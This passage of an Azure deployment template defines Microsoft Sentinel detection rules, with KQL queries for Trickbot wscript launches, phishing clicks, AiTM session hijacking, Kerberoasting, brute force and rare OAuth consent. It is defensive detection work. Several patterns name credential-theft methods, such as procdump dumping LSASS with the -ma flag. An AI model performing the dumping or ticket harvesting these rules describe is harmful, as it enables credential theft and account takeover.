              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/06d54295-b32d-4870-8585-b18efb7f3d0a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/06d54295-b32d-4870-8585-b18efb7f3d0a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Office Apps Launching Wscipt",
          "description": "This query was originally published in the threat analytics report, Trickbot: Pervasive & underestimated.\nTrickbot is a very prevalent piece of malware with an array of malicious capabilities. Originally designed to steal banking credentials, it has since evolved into a modular trojan that can deploy other malware, disable security software, and perform command-and-control (C2) operations.\nTrickbot is frequently spread through email. An attacker will send a target a message with an attachment containing a malicious macro. If the target enables the macro, it will write a JScript Encoded (JSE) file to disk (JScript is a Microsoft dialect of ECMAScript). The JSE file will then be launched using wscript.exe to perform a variety of malicious tasks, particularly reconnaissance.\nThe following query detects when Office applications have launched wscript.exe to run a JSE file.\nSee Detect rundll.exe being used for reconnaissance and command-and-control for another query related to Trickbot activity.\nReference - https://attack.mitre.org/software/S0266/",
          "severity": "Medium",
          "enabled": true,
          "query": "DeviceProcessEvents \n| where InitiatingProcessFileName in~ ('winword.exe', 'excel.exe', 'outlook.exe') \n| where FileName =~ \"wscript.exe\" and ProcessCommandLine has \".jse\"\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Collection",
            "CommandAndControl"
          ],
          "techniques": [
            "T1059",
            "T1105",
            "T1203"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "174de33b-107b-4cd8-a85d-b4025a35453f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessId"
                },
                {
                  "identifier": "CommandLine",
                  "columnName": "ProcessCommandLine"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4beed89b-e05b-4fdf-8c14-e9329765c69a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4beed89b-e05b-4fdf-8c14-e9329765c69a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Phishing link click observed in Network Traffic",
          "description": "The purpose of this content is to identify successful phishing links accessed by users. Once a user clicks on a phishing link, we observe successful network activity originating from non-Microsoft network devices. These devices may include Palo Alto Networks, Fortinet, Check Point, and Zscaler devices.",
          "severity": "Medium",
          "enabled": true,
          "query": "//Finding MDO Security alerts and extracting the Entities user, Domain, Ip, and URL.\nlet Alert_List= dynamic([\n\"Phishing link click observed in Network Traffic\",\n\"Phish delivered due to an IP allow policy\",\n\"A potentially malicious URL click was detected\",\n\"High Risk Sign-in Observed in Network Traffic\",\n\"A user clicked through to a potentially malicious URL\",\n\"Suspicious network connection to AitM phishing site\",\n\"Messages containing malicious entity not removed after delivery\",\n\"Email messages containing malicious URL removed after delivery\",\n\"Email reported by user as malware or phish\",\n\"Phish delivered due to an ETR override\",\n\"Phish not zapped because ZAP is disabled\"]);\nSecurityAlert\n|where ProviderName in~ (\"Office 365 Advanced Threat Protection\", \"OATP\")\n| where AlertName in~ (Alert_List)\n//extracting Alert Entities\n | extend Entities = parse_json(Entities)\n| mv-apply Entity = Entities on\n(\nwhere Entity.Type == 'account'\n| extend EntityUPN = iff(isempty(Entity.UserPrincipalName), tostring(strcat(Entity.Name, \"@\", tostring (Entity.UPNSuffix))), tostring(Entity.UserPrincipalName))\n)\n| mv-apply Entity = Entities on\n(\nwhere Entity.Type == 'url'\n| extend EntityUrl = tostring(Entity.Url)\n)\n| summarize AccountUpn=tolower(tostring(take_any(EntityUPN))),Url=tostring(tolower(take_any(EntityUrl))),AlertTime= min(TimeGenerated)by SystemAlertId, ProductName\n// filtering 3pnetwork devices\n| join kind= inner (CommonSecurityLog\n| where DeviceVendor has_any  (\"Palo Alto Networks\", \"Fortinet\", \"Check Point\", \"Zscaler\")\n| where DeviceAction != \"Block\"\n| where DeviceProduct startswith \"FortiGate\" or DeviceProduct startswith  \"PAN\" or DeviceProduct startswith  \"VPN\" or DeviceProduct startswith \"FireWall\" or DeviceProduct startswith  \"NSSWeblog\" or DeviceProduct startswith \"URL\"\n| where isnotempty(RequestURL)\n| where isnotempty(SourceUserName)\n| extend SourceUserName = tolower(SourceUserName)\n| project\n3plogTime=TimeGenerated,\nDeviceVendor,\nDeviceProduct,\nActivity,\nDestinationHostName,\nDestinationIP,\nRequestURL=tostring(tolower(RequestURL)),\nMaliciousIP,\nName = tostring(split(SourceUserName,\"@\")[0]),\nUPNSuffix =tostring(split(SourceUserName,\"@\")[1]),\nSourceUserName,\nIndicatorThreatType,\nThreatSeverity,AdditionalExtensions,\nThreatConfidence)on $left.Url == $right.RequestURL and $left.AccountUpn == $right.SourceUserName\n// Applied the condition where alert trigger 1st and then the 3p Network activity execution\n| where AlertTime between ((3plogTime - 1h) .. (3plogTime + 1h))\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2fed0668-6d43-4c78-87e6-510f96f12145",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "FullName",
                  "columnName": "SourceUserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "DNS",
              "fieldMappings": [
                {
                  "identifier": "DomainName",
                  "columnName": "DestinationHostName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DestinationIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7acab41d-6c7a-4dd9-b990-6ab3967df2ee')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7acab41d-6c7a-4dd9-b990-6ab3967df2ee')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "LSASS Credential Dumping with Procdump",
          "description": "This query was originally published in the threat analytics report, \"Exchange Server zero-days exploited in the wild\".\nIn early March 2021, Microsoft released patches for four different zero-day vulnerabilities affecting Microsoft Exchange Server. The vulnerabilities were being used in a coordinated attack. For more information on the vulnerabilities, visit the following links:\n1. CVE-2021-26855\n2. CVE-2021-26857\n3. CVE-2021-26858\n4. CVE-2021-27065\nThe following query looks for evidence of Procdump being used to dump credentials from LSASS, the Local Security Authentication Server. This might indicate an attacker has compromised user accounts.\nMore queries related to this threat can be found under the See also section of this page.\nReference - https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/",
          "severity": "High",
          "enabled": true,
          "query": "DeviceProcessEvents \n| where (FileName has_any (\"procdump.exe\", \"procdump64.exe\") and ProcessCommandLine has \"lsass\") or \n// Looking for Accepteula flag or Write a dump file with all process memory\n(ProcessCommandLine has \"lsass.exe\" and (ProcessCommandLine has \"-accepteula\" or ProcessCommandLine contains \"-ma\"))\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c332b840-61e4-462e-a201-0e2d69bad45d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f3c32954-4dce-4751-887c-17521c858fdc')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f3c32954-4dce-4751-887c-17521c858fdc')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Possible AiTM Phishing Attempt Against Microsoft Entra ID",
          "description": "Threat actors may attempt to phish users in order to hijack a users sign-in session, and skip the authentication process even if the user had enabled multifactor authentication (MFA) by stealing and replaying stolen credentials and session cookies.\nThis detection looks for successful Microsoft Entra ID sign ins that had a high risk profile, indicating it had suspicious characteristics such as an unusual location, ISP, user agent, or use of anonymizer services.\nIt then looks for a network connection to the IP address that made the sign in immediately before the sign in, that may indicate a user connecting to a phishing site at that IP address and having their authentication session hijacked.\nRef: https://www.microsoft.com/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/",
          "severity": "Medium",
          "enabled": true,
          "query": "let time_threshold = 10m;\nlet RiskySignins = materialize (SigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType == 0\n| where RiskLevelDuringSignIn =~ \"high\" or RiskLevelAggregated =~ \"high\"\n| extend SignInTime = TimeGenerated, Name=split(UserPrincipalName, \"@\")[0], UPNSuffix=split(UserPrincipalName, \"@\")[1]);\nlet ips = todynamic(toscalar(RiskySignins | summarize make_list(IPAddress)));\nRiskySignins\n| join kind=inner (_Im_WebSession(starttime=ago(1d), ipaddr_has_any_prefix=ips, eventresult=\"Success\", pack=True))\non $left.IPAddress == $right.DstIpAddr\n| where EventStartTime < TimeGenerated\n| extend TimeDelta = TimeGenerated - EventStartTime\n| where TimeDelta <= time_threshold\n| extend NetworkEventStartTime = EventStartTime, NetworkEventEndTime = EventEndTime\n| extend SrcUsername = column_ifexists(\"SrcUsername\", \"Unknown\")\n| project-reorder SignInTime, UserPrincipalName, IPAddress, AppDisplayName, ClientAppUsed, DeviceDetail, LocationDetails, NetworkLocationDetails, RiskEventTypes, UserAgent, NetworkEventStartTime, NetworkEventEndTime, SrcIpAddr, DstIpAddr, DstPortNumber, Dvc, DvcHostname, SrcBytes, NetworkProtocol, SrcUsername\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "DefenseEvasion",
            "CredentialAccess"
          ],
          "techniques": [
            "T1078",
            "T1557",
            "T1111"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "16daa67c-b137-48dc-8eb7-76598a44791a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Possible AiTM Phishing Attempt Against {{UserPrincipalName}} From {{IPAddress}}",
            "alertDescriptionFormat": "Threat actors may attempt to phish users in order to hijack a users sign-in session, and skip the authentication process even if the user had enabled multifactor authentication (MFA) by stealing and replaying stolen credentials and session cookies.\nThis detection looks for successful Microsoft Entra ID sign ins (in this case from {{UserPrincipalName}}) that had a high risk profile, indicating it had suspicious characteristics such as an unusual location, ISP, user agent, or use of anonymizer services.\nIt then looks for a network connection to the IP address (in this case {{IPAddress}}) that made the sign in immediately before the sign in, that may indicate a user connecting to a phishing site at that IP address and having their authentication session hijacked.\nRef: https://www.microsoft.com/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/\n"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8671cceb-c08a-4b5e-8c45-4893ee94528d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8671cceb-c08a-4b5e-8c45-4893ee94528d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect Potential Kerberoast Activities",
          "description": "This query aim to detect if someone requests service tickets (where count => maxcount)\nThe query requires trimming to set a baseline level for MaxCount  \nMitre Technique: Kerberoasting (T1558.003)\n@MattiasBorg82",
          "severity": "Medium",
          "enabled": true,
          "query": "let MaxCount = 70; //Number of requests per 2 minute timeframe, depending on org size.\nIdentityLogonEvents\n| where ActionType == \"LogonSuccess\"\n| where Protocol == \"Kerberos\"\n| extend json = todynamic(parse_json(tostring(AdditionalFields)))\n| extend SPN = json.Spns,\n       AttackTechniques = json.AttackTechniques\n      | project-away json\n| where isnotempty(SPN)\n| where AttackTechniques has \"T1558.003\"\n| mv-expand SPN\n        | extend SPNType = tostring(extract(@\"^\\w+\",0,tostring(SPN)))\n| distinct tostring(SPN), DeviceName, AccountUpn, AccountSid, bin(TimeGenerated, 2m), ReportId, tostring(AttackTechniques)\n| summarize count(), SPNS=(make_list(SPN, 100000)),ReportId=tostring((make_list(ReportId, 100000))[0]) by AccountUpn,AccountSid,DeviceName, bin(TimeGenerated, 2m), tostring(AttackTechniques)\n| extend SPNS = (replace_regex(tostring(SPNS), @'[^\\w+-\\/]+', '')) \n| where count_ >= MaxCount\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n| extend AccountDomain = tostring(split(AccountUpn, '@')[1]), AccountName = tostring(split(AccountUpn, '@')[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1558"
          ],
          "subTechniques": [
            "T1558.003"
          ],
          "alertRuleTemplateName": "12134de5-361b-427c-a1a0-d43f40a593c4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountUpn"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "AccountDomain"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a2758081-6ea8-4b98-be23-95f0a1393a31')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a2758081-6ea8-4b98-be23-95f0a1393a31')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Brute force attack against Azure Portal",
          "description": "Detects Azure Portal brute force attacks by monitoring for multiple authentication failures and a successful login within a 20-minute window. Default settings: 10 failures, 25 deviations.\nRef: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Set threshold value for deviation\nlet threshold = 25;\n// Set the time range for the query\nlet timeRange = 24h;\n// Set the authentication window duration\nlet authenticationWindow = 20m;\n// Define a reusable function 'aadFunc' that takes a table name as input\nlet aadFunc = (tableName: string) {\n  // Query the specified table\n  table(tableName)\n  // Filter data within the last 24 hours\n  | where TimeGenerated > ago(1d)\n  // Filter records related to \"Azure Portal\" applications\n  | where AppDisplayName has \"Azure Portal\"\n  // Extract and transform some fields\n  | extend\n      DeviceDetail = todynamic(DeviceDetail),\n      LocationDetails = todynamic(LocationDetails)\n  | extend\n      OS = tostring(DeviceDetail.operatingSystem),\n      Browser = tostring(DeviceDetail.browser),\n      State = tostring(LocationDetails.state),\n      City = tostring(LocationDetails.city),\n      Region = tostring(LocationDetails.countryOrRegion)\n  // Categorize records as Success or Failure based on ResultType\n  | extend FailureOrSuccess = iff(ResultType in (\"0\", \"50125\", \"50140\", \"70043\", \"70044\"), \"Success\", \"Failure\")\n  // Sort and identify sessions\n  | sort by UserPrincipalName asc, TimeGenerated asc\n  | extend SessionStartedUtc = row_window_session(TimeGenerated, timeRange, authenticationWindow, UserPrincipalName != prev(UserPrincipalName) or prev(FailureOrSuccess) == \"Success\")\n  // Summarize data\n  | summarize FailureOrSuccessCount = count() by  FailureOrSuccess, UserId, UserDisplayName, AppDisplayName, IPAddress, Browser, OS, State, City, Region, Type, CorrelationId, bin(TimeGenerated, authenticationWindow), ResultType, UserPrincipalName, SessionStartedUtc\n  | summarize FailureCountBeforeSuccess = sumif(FailureOrSuccessCount, FailureOrSuccess == \"Failure\"), StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), makelist(FailureOrSuccess), IPAddress = make_set(IPAddress, 15), make_set(Browser, 15), make_set(City, 15), make_set(State, 15), make_set(Region, 15), make_set(ResultType, 15) by SessionStartedUtc, UserPrincipalName, CorrelationId, AppDisplayName, UserId, Type\n  // Filter records where \"Success\" occurs in the middle of a session\n  | where array_index_of(list_FailureOrSuccess, \"Success\") != 0\n  | where array_index_of(list_FailureOrSuccess, \"Success\") == array_length(list_FailureOrSuccess) - 1\n  // Remove unnecessary columns from the output\n  | project-away SessionStartedUtc, list_FailureOrSuccess\n  // Join with another table and calculate deviation\n  | join kind=inner (\n      table(tableName)\n      | where TimeGenerated > ago(7d)\n      | where AppDisplayName has \"Azure Portal\"\n      | extend FailureOrSuccess = iff(ResultType in (\"0\", \"50125\", \"50140\", \"70043\", \"70044\"), \"Success\", \"Failure\")\n      | summarize avgFailures = avg(todouble(FailureOrSuccess == \"Failure\")) by UserPrincipalName\n  ) on UserPrincipalName\n  | extend Deviation = abs(FailureCountBeforeSuccess - avgFailures) / avgFailures\n  // Filter records based on deviation and failure count criteria\n  | where Deviation > threshold and FailureCountBeforeSuccess >= 10\n  // Expand the IPAddress array\n  | mv-expand IPAddress\n  | extend IPAddress = tostring(IPAddress)\n  | extend timestamp = StartTime\n};\n// Call 'aadFunc' with different table names and union the results\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n// Additional transformation - Split UserPrincipalName\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "28b42356-45af-40a6-a0b4-a554cdfd5d8a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "UserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.1.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2d0da4f6-88cc-4583-b1c6-a076a46aa87c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2d0da4f6-88cc-4583-b1c6-a076a46aa87c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Rare application consent",
          "description": "This will alert when the \"Consent to application\" operation occurs by a user that has not done this operation before or rarely does this.\nThis could indicate that permissions to access the listed Azure App were provided to a malicious actor.\nConsent to application, Add service principal and Add OAuth2PermissionGrant should typically be rare events.\nThis may help detect the Oauth2 attack that can be initiated by this publicly available tool - https://github.com/fireeye/PwnAuth\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.",
          "severity": "Medium",
          "enabled": true,
          "query": "let current = 1d;\nlet auditLookback = 7d;\n// Setting threshold to 3 as a default, change as needed.\n// Any operation that has been initiated by a user or app more than 3 times in the past 7 days will be excluded\nlet threshold = 3;\n// Gather initial data from lookback period, excluding current, adjust current to more than a single day if no results\nlet AuditTrail = AuditLogs | where TimeGenerated >= ago(auditLookback) and TimeGenerated < ago(current)\n// 2 other operations that can be part of malicious activity in this situation are\n// \"Add OAuth2PermissionGrant\" and \"Add service principal\", extend the filter below to capture these too\n| where OperationName has \"Consent to application\"\n| extend InitiatedBy = iff(isnotempty(tostring(InitiatedBy.user.userPrincipalName)),\n          tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"ServicePrincipal\"\n      | extend TargetResourceName = tolower(tostring(TargetResource.displayName))\n  )\n| summarize max(TimeGenerated), OperationCount = count() by OperationName, InitiatedBy, TargetResourceName\n// only including operations initiated by a user or app that is above the threshold so we produce only rare and has not occurred in last 7 days\n| where OperationCount > threshold;\n// Gather current period of audit data\nlet RecentConsent = AuditLogs | where TimeGenerated >= ago(current)\n| where OperationName has \"Consent to application\"\n| extend IpAddress = case(\n              isnotempty(tostring(InitiatedBy.user.ipAddress)) and tostring(InitiatedBy.user.ipAddress) != 'null', tostring(InitiatedBy.user.ipAddress),\n              isnotempty(tostring(InitiatedBy.app.ipAddress)) and tostring(InitiatedBy.app.ipAddress) != 'null', tostring(InitiatedBy.app.ipAddress),\n              'Not Available')\n| extend InitiatedBy = iff(isnotempty(tostring(InitiatedBy.user.userPrincipalName)),\n                          tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"ServicePrincipal\"\n      | extend TargetResourceName = tolower(tostring(TargetResource.displayName)),\n               props = TargetResource.modifiedProperties\n  )\n| parse props with * \"ConsentType: \" ConsentType \"]\" *\n| mv-apply AdditionalDetail = AdditionalDetails on \n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend UserAgent = tostring(AdditionalDetail.value)\n  )\n| project TimeGenerated, InitiatedBy, IpAddress, TargetResourceName, Category, OperationName, ConsentType, UserAgent, CorrelationId, Type;\n// Exclude previously seen audit activity for \"Consent to application\" that was seen in the lookback period\n// First for rare InitiatedBy\nlet RareConsentBy = RecentConsent | join kind= leftanti AuditTrail on OperationName, InitiatedBy\n| extend Reason = \"Previously unseen user consenting\";\n// Second for rare TargetResourceName\nlet RareConsentApp = RecentConsent | join kind= leftanti AuditTrail on OperationName, TargetResourceName\n| extend Reason = \"Previously unseen app granted consent\";\nRareConsentBy | union RareConsentApp\n| summarize Reason = make_set(Reason,100) by TimeGenerated, InitiatedBy, IpAddress, TargetResourceName, Category, OperationName, ConsentType, UserAgent, CorrelationId, Type\n| extend timestamp = TimeGenerated, Name = tolower(tostring(split(InitiatedBy,'@',0)[0])), UPNSuffix = tolower(tostring(split(InitiatedBy,'@',1)[0]))\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 3,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1136",
            "T1068"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "83ba3057-9ea3-4759-bf6a-933f2e5bc7ee",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatedBy"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
